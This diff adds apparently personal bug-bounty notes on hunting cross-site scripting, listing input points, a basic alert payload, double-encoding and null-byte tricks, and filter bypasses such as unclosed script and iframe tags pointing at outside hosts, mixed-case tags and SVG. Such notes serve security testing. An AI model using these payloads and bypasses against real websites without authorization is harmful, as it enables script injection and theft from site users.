@@ -1,0 +1,40 @@
+ Always check for HTML injection first, then move to XSS
+>look for input opportunities:
+    -forms
+    -comments
+    -user profiles
+    -blog posts
+    -Search boxes
+    -sign ups
+>insert xss payloads in the input fields <script>alert("xss by kingpin")'</script>
+>Test different encodings and checking for any weird behaviour 
+1.What payloads are allowed on the parameter we are testing and how does the website reflect\handles it!
+2.Can I input the most basic <h2>, <img>, <table> without any filtering and it's reflected as HTML?
+3. Are they filtering malicious HTML? 
+4.If it's reflected as &lt; or %3C then I will test for double encoding %253C and %26lt; to see how it handles those types of encoding
+6.Interesting encodings https://d3adend.org/xss/ghettoBypass.
+7.This step is about finding out what's allowed and isn't & how they handle our payload. For example if <script> was reflected as &lt;script&gt;, but %26lt;script%26gt; was reflected as <script>, then I know I am onto a bypass and I can begin to understand how they are
+handling encodings (which will help me in later bugs maybe!). 
+8.If not matter what you try you always see &lt;script&gt; or %3Cscript%3E then the parameter in question may not be vulnerable.
+
+Reverse Engineering developers thoughts
+1.Figuring out what type of filters they have created(and start asking.. why?
+2. Does this same filter exist elsewhere throughout the webapp?).
+3. So for example if I notice they are filtering <script>, <iframe> aswell as “onerror=”, but notice they aren’t filtering <script then we know it's game on and time to get creative.
+4. Are they only looking for complete valid HTML tags? 
+5.If so we can bypass with <script src=//mysite.com?c=  If we don't end the script tag the HTML is instead appended as a parameter value.
+6.Is it just a blacklist of bad HTML tags? Perhaps the developer isn't up to date and forgot about things such as <svg>.
+7. If it is just a blacklist, then does this blacklist exist elsewhere?
+8 Think about file uploads. How does this website in question handle encodings? <%00iframe, on%0derror.
+
+Testing for XSS flow:
+- How are “non-malicious” HTML tags such as <h2> handled?
+- What about incomplete tags? <iframe src=//zseano.com/c=
+- How do they handle encodings such as <%00h2? (There are LOTS to try
+here, %0d, %0a, %09 etc)
+- Is it just a blacklist of hardcoded strings? Does </script/x> work? <ScRipt>
+
+Xss-Filter-Bypass: https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
+
+
+
